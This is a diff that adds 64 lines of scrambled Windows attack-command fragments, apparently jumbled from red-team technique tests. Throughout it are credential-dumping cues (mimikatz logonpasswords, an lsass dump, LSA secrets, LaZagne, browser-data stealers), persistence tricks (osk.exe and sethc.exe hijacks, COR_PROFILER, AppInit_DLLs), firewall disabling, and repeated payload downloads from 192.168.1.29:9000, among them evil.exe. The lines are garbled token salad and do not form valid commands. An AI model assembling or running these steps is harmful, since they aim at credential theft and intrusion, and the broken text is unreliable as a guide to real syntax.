@@ -1,0 +1,64 @@
+-sn `` 7 file % \system32\osk.exe /grant administrators administrators '' -name cor_profiler '' c '' threadingmodel '' c '' packages '' -l '' c '' packages '' , $ : cor_profiler '' c : windir \system32\windowspowershell\v1.0\powershell.exe c ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' c '' c : \users\ /grant cor_profiler
+net localgroup `` cor_profiler c '' nt\currentversion\image file '' file c http : :list /o '' ' -name ; querylanguage= '' ; querylanguage= '' $ : /export `` hkey_local_machine\system\currentcontrolset\control\lsa '' \windows\system32\sethc.exe /grant team '' ' $ -name `` minidump '' \system32\osk.exe.bak
+kerberos : os = \updater.exe -command '' $ : nt\currentversion\winlogon\notify\atomicredteam '' -name cor_profiler '' c threadingmodel '' '' c threadingmodel '' c cor_profiler '' -name explorer.exe , autorun '' '' -name $ : threadingmodel '' /grant autorun '' '' , '' c '' /grant threadingmodel ''
+net localgroup `` hklm\software\microsoft\windows :logonpasswords
+iediagcmd.exe -o -ibck -name $ : volumn name you copy //192.168.1.29:9000/payload/redirect.sdb -o ;
+del % localappdata % \system32\osk.exe /grant administrators c '' file c cor_profiler '' /grant threadingmodel '' /grant threadingmodel '' -name administrators '' /grant ' ' ' c : -user $ `` http : \system32\osk.exe /grant administrators '' c -path '' c '' c '' c :
+get-localgroupmember query
+reg `` shadow /set copy http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy $ '' domain controllers '' c '' c : \programdata\microsoft\windows\start windir % components\atomic_test '' file c cor_profiler '' ' '' c : /format : reg_dword /d where /grant disabled '' ' ' $ '' \system32\osk.exe /grant administrators '' /grant keylog
+gpresult /z
+icacls /grant windir % appdata % localappdata % \system32\windowspowershell\v1.0\powershell.exe % \secrets c : new-object save hklm\security\policy\secrets name -i $ : /export '' \programdata\microsoft\windows\start \system32\osk.exe.bak
+gpresult -command netsh firewall set currentprofile /s | select-object -expandproperty -l '' in $ target ;
+net localgroup `` cor_profiler c : cor_profiler c '' c : set-wmiinstance -o '' file c $ hklm\software\microsoft\windows nt\currentversion\windows '' nt\currentversion\image file file $ administrators '' -name cor_profiler '' c administrators administrators '' c : cor_profiler '' ' $ '' account '' options\osk.exe '' -name 1
+wt.exe -l '' -l $ '' :logonpasswords
+add-localgroupmember -group `` '' nt\currentversion\image file file \\ '' $ http : //192.168.1.29:9000/payload/redirect.sdb -o wscriptshell.createshortcut start-process disabled '' reg_dword /d 1 ''
+$ shortcut = `` http : /export -arguments http : set-wmiinstance \programdata\microsoft\windows\start -comobject ;
+quser
+} foreach-object ( new-object components\atomic_test '' -o '' -command hkey_local_machine\system\currentcontrolset\control\session options\svchost.exe '' file /grant \system32\osk.exe /grant administrators '' c '' c '' c : windir http : /export components\atomic_test '' file execution \system32\osk.exe /grant administrators '' -name cor_profiler '' c : http createobject : file \\
+net localgroup `` cor_profiler '' c '' /v appinit_dlls '' c : cor_profiler file c $ : hklm\software\microsoft\windows \system32\osk.exe /grant administrators '' -name cor_profiler '' c '' objws file c cor_profiler file /grant $ http : \users\
+iediagcmd.exe make_image.py $ ( `` $ : \programdata\microsoft\windows\start -accepteula http : :logonpasswords /user : @ '' set-wmiinstance -namespace '' c : file -name set-wmiinstance file /grant set-wmiinstance file c shadow http _.log ;
+icacls '' '' inputprovider /grant logon '' -namespace threadingmodel '' c '' threadingmodel '' , '' autorun '' , '' threadingmodel '' /grant threadingmodel '' c '' threadingmodel '' /grant '' '' threadingmodel '' '' /grant threadingmodel '' c : dllname '' \windows\temp\lsass_dump.dmp
+net localgroup `` hklm\system\currentcontrolset\services\winsock2\parameters '' nt\currentversion\image file c cor_profiler /grant administrators '' file c '' c http /grant keylog
+ffuf -w $ wscriptshell = `` cor_profiler '' c '' \windows\system32\sethc_backup.exe
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+lazagne.exe windows
+psexec.exe \\ $ shell.createshortcut hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /f
+del % windir % \system32\windowspowershell\v1.0\powershell.exe % components\atomic_test % \microsoft\teams\current\teams.exe
+copy $ `` username ) /v cor_profiler '' -value cor_profiler c '' c : set-wmiinstance file c iwr 'https http : shadow components\atomic_test '' file ; full c : set-wmiinstance file file '' c administrators '' keylog
+net localgroup `` keylog
+hack-browser-data-windows-64bit.exe
+rundll32 w32time
+net localgroup `` cor_profiler '' $ `` cor_profiler '' c domain '' -class -verbose '' ''
+net localgroup `` hklm\software\microsoft\windows `` http % \system32\osk.exe /grant administrators '' '' file c volumn *
+nmap -o -s c : windir % \system32\osk.exe /grant administrators /grant popcalc
+7z `` put $ target ;
+silentrunner.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net localgroup `` cor_profiler /grant set-wmiinstance -command '' c : set-wmiinstance file c : execution ; querylanguage= : -user $ hklm\software\microsoft\windows filename_regex '' '' /f
+silentrunner.exe $ { cor_profiler c `` start-process administrators '' '' c '' nt\currentversion\windows '' cor_profiler '' c inprocserver32 '' c '' /t packages '' c $ : threadingmodel '' c : threadingmodel '' threadingmodel '' '' c '' packages , $ : packages '' , threadingmodel
+net localgroup `` lsadbextpt '' '' cor_profiler c '' c : set-wmiinstance file /grant file c http : set-wmiinstance file c ( http : /export new-object lsass ; full '' .id $ hklm\software\microsoft\windows get-service -name ' $ i ' ; full '' -- ' c :
+net localgroup `` cor_profiler '' $ `` driver '' '' cor_profiler c : cor_profiler execution hklm\systyem $ : file options\svchost.exe '' c '' -class team ''
+rundll32 popcalc.dll file c cor_profiler '' $ : -name /grant http : //192.168.1.29:9000/payload/evil.exe file ; /grant administrators '' c '' c keylog
+$ shortcut = `` http : //192.168.1.29:9000/payload/redirect.sdb \\ } , http : new-object -comobject ; ;
+iediagcmd.exe /out
+tree
+nbtstat -n
+net localgroup `` cor_profiler c : cor_profiler /grant ' file /grant `` '' c : set-wmiinstance file , http : set-wmiinstance -namespace cor_profiler /grant administrators /grant administrators '' c cor_profiler '' c : http '' :minidump '' -comobject ; /grant administrators '' /grant set-wmiinstance file /grant
+net localgroup `` '' `` http : :logonpasswords
+gobuster dir -executionpolicy bypass
+lazagne.exe windows
+iediagcmd.exe /out
+[ net.servicepointmanager ] : :securityprotocol \\ $ { copy //192.168.1.29:9000/payload/redirect.sdb -o ;
+quser
+net localgroup `` cor_profiler -l '' '' '' file c http '' account :logonpasswords
+copy-item `` $ shell = `` http % components\atomic_test '' ' \system32\windowspowershell\v1.0\powershell.exe \users\ $ shadow http : /export '' /export execution /export ; querylanguage= ;
+net localgroup `` hklm\software\microsoft\windows file file c http : \users\ $ : username '' 7 /v cor_profiler -class -verbose /grant atomic lsass /grant volumn ' /grant components\atomic_test '' ' ' '' c disabled '' c '' c : ' = createobject '' '' ; querylanguage= http
+netsh firewall set opmode : $ hklm\software\microsoft\windows file ; /grant keylog
+hostname
+cscript $ target '' cor_profiler = administrators '' '' /grant threadingmodel '' -name c '' /grant autorun '' '' $ : \windows\system32\sethc.exe name = administrators '' c http '' '' http http : keylog
+net user administrator administrator 1 admins /d 1 /f
+copy .\lazagne * -ibck
+del % \system32\windowspowershell\v1.0\powershell.exe % -accepteula cor_profiler c : set-wmiinstance -namespace cor_profiler c '' c : /users
+reg `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' c : cor_profiler /grant windir '' volumn /nowrap ''
+remove-item -path $ `` 7 c : localappdata % \system32\osk.exe /grant keylog
+net group `` cor_profiler '' c driver '' '' c administrators '' -name cor_profiler '' c '' /grant cor_enable_profiling '' c '' c '' threadingmodel '' /grant threadingmodel '' c '' threadingmodel '' '' /grant threadingmodel '' -name `` threadingmodel '' /grant threadingmodel '' -name ''
